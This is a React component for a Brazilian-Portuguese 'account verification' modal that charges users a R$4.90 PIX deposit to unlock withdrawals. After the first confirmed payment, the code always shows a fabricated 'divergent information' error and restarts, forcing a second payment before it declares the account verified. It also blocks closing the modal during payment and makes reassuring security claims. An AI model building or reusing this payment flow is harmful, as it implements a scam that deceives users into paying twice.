import React, { useState, useEffect } from 'react';
import { X, Shield, CheckCircle, AlertCircle, Lock } from 'lucide-react';
import { KYCStatus } from '../types';
import { useFictionalPix } from '../hooks/useFictionalPix';
import { QRCodeGenerator } from './QRCodeGenerator';

interface KYCVerificationModalProps {
  isOpen: boolean;
  onClose: () => void;
  kycStatus: KYCStatus;
  onUpdateKYC: (status: KYCStatus) => void;
  onAddBalance: (amount: number) => void;
}

type KYCStep = 'intro' | 'pix-payment' | 'processing' | 'error' | 'success';

export const KYCVerificationModal: React.FC<KYCVerificationModalProps> = ({
  isOpen,
  onClose,
  kycStatus,
  onUpdateKYC,
  onAddBalance
}) => {
  const [currentStep, setCurrentStep] = useState<KYCStep>('intro');
  const [attemptCount, setAttemptCount] = useState(0);
  const [copied, setCopied] = useState(false);
  const [paymentCheckInterval, setPaymentCheckInterval] = useState<NodeJS.Timeout | null>(null);

  const { loading, error, pixData, createPix, checkPixStatus, reset } = useFictionalPix();

  const KYC_AMOUNT = 4.90;

  useEffect(() => {
    if (isOpen) {
      if (kycStatus.isVerified) {
        setCurrentStep('success');
      } else {
        setCurrentStep('intro');
        setAttemptCount(0);
      }
    }

    return () => {
      if (paymentCheckInterval) {
        clearInterval(paymentCheckInterval);
      }
    };
  }, [isOpen, kycStatus.isVerified]);

  useEffect(() => {
    if (!pixData || !isOpen || currentStep !== 'pix-payment') return;

    const checkPayment = async () => {
      try {
        const status = await checkPixStatus(pixData.transactionId);

        if (status.status === 'paid') {
          if (paymentCheckInterval) {
            clearInterval(paymentCheckInterval);
            setPaymentCheckInterval(null);
          }

          onAddBalance(status.value);
          setCurrentStep('processing');

          setTimeout(() => {
            if (attemptCount === 0) {
              setCurrentStep('error');
              setTimeout(() => {
                setAttemptCount(1);
                reset();
                setCurrentStep('intro');
              }, 3500);
            } else {
              const updatedKYC: KYCStatus = {
                isVerified: true,
                identityVerified: true,
                depositVerified: true
              };
              onUpdateKYC(updatedKYC);
              setCurrentStep('success');
            }
          }, 2500);
        }
      } catch (err) {
        console.error('Erro ao verificar pagamento:', err);
      }
    };

    checkPayment();
    const interval = setInterval(checkPayment, 3000);
    setPaymentCheckInterval(interval);

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [pixData, isOpen, currentStep, attemptCount]);

  const handleStartVerification = async () => {
    try {
      await createPix(KYC_AMOUNT);
      setCurrentStep('pix-payment');
    } catch (err) {
      console.error('Erro ao gerar PIX:', err);
    }
  };

  const copyPixCode = async () => {
    if (!pixData?.qrcode) return;

    try {
      await navigator.clipboard.writeText(pixData.qrcode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error('Erro ao copiar:', err);
    }
  };

  const handleCloseModal = () => {
    if (currentStep === 'pix-payment' || currentStep === 'processing') return;

    if (paymentCheckInterval) {
      clearInterval(paymentCheckInterval);
      setPaymentCheckInterval(null);
    }

    reset();
    onClose();
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 z-50">
      <div className="bg-gray-900 rounded-3xl shadow-2xl w-full max-w-md max-h-[90vh] overflow-y-auto border border-gray-800">

        {currentStep === 'intro' && (
          <>
            <div className="bg-gradient-to-br from-blue-600 to-blue-800 p-6 relative overflow-hidden">
              <div className="absolute inset-0 bg-white/5"></div>
              <button
                onClick={handleCloseModal}
                className="absolute top-4 right-4 text-white/80 hover:text-white transition-colors z-10"
              >
                <X className="w-6 h-6" />
              </button>

              <div className="relative z-10">
                <div className="w-16 h-16 bg-white/20 rounded-2xl flex items-center justify-center mx-auto mb-4">
                  <Shield className="w-8 h-8 text-white" />
                </div>
                <h2 className="text-2xl font-bold text-white text-center mb-2">
                  Verificacao de Conta
                </h2>
                <p className="text-white/90 text-center text-sm">
                  Confirme sua identidade para liberar saques
                </p>
              </div>
            </div>

            <div className="p-6">
              <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl p-4 mb-6">
                <div className="flex items-start gap-3">
                  <Lock className="w-5 h-5 text-blue-400 flex-shrink-0 mt-0.5" />
                  <div>
                    <h3 className="text-blue-200 font-bold text-sm mb-2">
                      Por que preciso verificar?
                    </h3>
                    <p className="text-blue-300/90 text-xs leading-relaxed">
                      A verificacao de titularidade e obrigatoria para confirmar que voce e o dono da conta e liberar funcoes financeiras como saque e deposito.
                    </p>
                  </div>
                </div>
              </div>

              <div className="bg-gray-800 rounded-xl p-5 mb-6 border border-gray-700">
                <div className="text-center">
                  <div className="text-3xl mb-3">💳</div>
                  <h3 className="text-white font-bold text-lg mb-2">
                    Deposito de Verificacao
                  </h3>
                  <p className="text-gray-400 text-sm mb-4">
                    Para confirmar sua titularidade, realize um deposito minimo via PIX
                  </p>

                  <div className="bg-blue-500/20 rounded-xl py-3 px-4 mb-4 border border-blue-500/30">
                    <div className="text-blue-200 text-xs mb-1">Valor da verificacao</div>
                    <div className="text-white text-2xl font-bold">
                      R$ {KYC_AMOUNT.toFixed(2).replace('.', ',')}
                    </div>
                  </div>

                  <button
                    onClick={handleStartVerification}
                    disabled={loading}
                    className="w-full bg-blue-600 text-white font-bold py-4 rounded-xl hover:bg-blue-700 transition-all duration-300 active:scale-95 disabled:opacity-50"
                  >
                    {loading ? (
                      <div className="flex items-center justify-center gap-3">
                        <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                        <span>Gerando PIX...</span>
                      </div>
                    ) : (
                      'Iniciar Verificacao'
                    )}
                  </button>
                </div>
              </div>

              <div className="bg-gray-800/50 rounded-xl p-4 border border-gray-700">
                <h4 className="text-white font-semibold text-sm mb-3 flex items-center gap-2">
                  <CheckCircle className="w-4 h-4 text-accent" />
                  Seguranca Garantida
                </h4>
                <ul className="space-y-2 text-gray-400 text-xs">
                  <li className="flex items-start gap-2">
                    <span className="text-accent mt-0.5">•</span>
                    <span>Dados protegidos com criptografia</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="text-accent mt-0.5">•</span>
                    <span>Verificacao automatica apos pagamento</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="text-accent mt-0.5">•</span>
                    <span>Valor creditado automaticamente</span>
                  </li>
                </ul>
              </div>
            </div>
          </>
        )}

        {currentStep === 'pix-payment' && pixData && (
          <>
            <div className="bg-blue-600 p-5 relative overflow-hidden">
              <div className="absolute inset-0 bg-white/5"></div>
              <div className="relative z-10 text-center">
                <div className="w-12 h-12 bg-white/20 rounded-xl flex items-center justify-center mx-auto mb-3">
                  <Shield className="w-6 h-6 text-white" />
                </div>
                <h2 className="text-xl font-bold text-white mb-1">
                  PIX de Verificacao
                </h2>
                <div className="bg-white/20 rounded-lg px-3 py-1 inline-block">
                  <span className="text-white font-bold text-sm">
                    R$ {pixData.amount.toFixed(2).replace('.', ',')}
                  </span>
                </div>
              </div>
            </div>

            <div className="p-5">
              <div className="bg-gray-800 rounded-xl p-4 mb-4 border border-gray-700">
                <div className="bg-white rounded-lg p-4 shadow-lg">
                  <QRCodeGenerator
                    value={pixData.qrcode}
                    size={200}
                    className="mx-auto"
                  />
                </div>
                <p className="text-gray-400 text-sm mt-3 text-center">
                  Escaneie com o app do seu banco
                </p>
              </div>

              <div className="mb-4">
                <label className="block text-gray-400 font-semibold mb-2 text-xs">
                  Codigo Copia e Cola
                </label>
                <input
                  type="text"
                  value={pixData.qrcode}
                  readOnly
                  className="w-full px-3 py-3 bg-gray-800 border border-gray-700 rounded-lg text-xs font-mono mb-3 text-gray-300 focus:outline-none"
                  onClick={(e) => (e.target as HTMLInputElement).select()}
                />
                <button
                  onClick={copyPixCode}
                  className={`w-full py-3 rounded-lg font-bold transition-all duration-300 ${
                    copied
                      ? 'bg-accent text-white'
                      : 'bg-blue-600 text-white hover:bg-blue-700'
                  }`}
                >
                  {copied ? 'Codigo Copiado!' : 'Copiar Codigo PIX'}
                </button>
              </div>

              <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl p-3">
                <div className="flex items-center justify-center gap-2">
                  <div className="w-3 h-3 border-2 border-blue-400 border-t-transparent rounded-full animate-spin"></div>
                  <p className="text-blue-300 text-sm font-medium">
                    Aguardando confirmacao do pagamento...
                  </p>
                </div>
              </div>
            </div>
          </>
        )}

        {currentStep === 'processing' && (
          <div className="p-8">
            <div className="text-center">
              <div className="w-20 h-20 bg-blue-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
                <div className="w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
              </div>
              <h3 className="text-white font-bold text-xl mb-2">
                Processando Verificacao
              </h3>
              <p className="text-gray-400 text-sm">
                Aguarde enquanto validamos suas informacoes...
              </p>
            </div>
          </div>
        )}

        {currentStep === 'error' && (
          <div className="p-8">
            <div className="text-center">
              <div className="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
                <AlertCircle className="w-10 h-10 text-red-500" />
              </div>
              <h3 className="text-white font-bold text-xl mb-2">
                Erro na Verificacao
              </h3>
              <p className="text-gray-400 text-sm mb-4">
                Informacoes divergentes. Por favor, refaca a verificacao KYC.
              </p>
              <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-3">
                <p className="text-red-300 text-xs">
                  Reiniciando processo...
                </p>
              </div>
            </div>
          </div>
        )}

        {currentStep === 'success' && (
          <>
            <div className="bg-gradient-to-br from-accent to-green-600 p-6 relative overflow-hidden">
              <div className="absolute inset-0 bg-white/5"></div>
              <button
                onClick={handleCloseModal}
                className="absolute top-4 right-4 text-white/80 hover:text-white transition-colors z-10"
              >
                <X className="w-6 h-6" />
              </button>

              <div className="relative z-10 text-center">
                <div className="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-4">
                  <CheckCircle className="w-8 h-8 text-white" />
                </div>
                <h2 className="text-2xl font-bold text-white mb-2">
                  Verificacao Concluida!
                </h2>
                <p className="text-white/90 text-sm">
                  Sua conta foi validada com sucesso
                </p>
              </div>
            </div>

            <div className="p-6">
              <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-5 mb-6 text-center">
                <div className="text-4xl mb-3">✓</div>
                <h3 className="text-white font-bold text-lg mb-2">
                  Conta Verificada
                </h3>
                <p className="text-gray-400 text-sm">
                  Agora voce pode realizar saques a qualquer momento
                </p>
              </div>

              <div className="bg-gray-800 rounded-xl p-4 border border-gray-700 mb-4">
                <h4 className="text-white font-semibold text-sm mb-3">
                  Funcoes Liberadas
                </h4>
                <div className="space-y-2">
                  <div className="flex items-center gap-2 text-gray-400 text-sm">
                    <CheckCircle className="w-4 h-4 text-accent" />
                    <span>Saques ilimitados</span>
                  </div>
                  <div className="flex items-center gap-2 text-gray-400 text-sm">
                    <CheckCircle className="w-4 h-4 text-accent" />
                    <span>Depositos instantaneos</span>
                  </div>
                  <div className="flex items-center gap-2 text-gray-400 text-sm">
                    <CheckCircle className="w-4 h-4 text-accent" />
                    <span>Conta totalmente verificada</span>
                  </div>
                </div>
              </div>

              <button
                onClick={handleCloseModal}
                className="w-full bg-accent text-white font-bold py-4 rounded-xl hover:bg-accent-hover transition-all duration-300 active:scale-95"
              >
                Fechar
              </button>
            </div>
          </>
        )}
      </div>
    </div>
  );
};
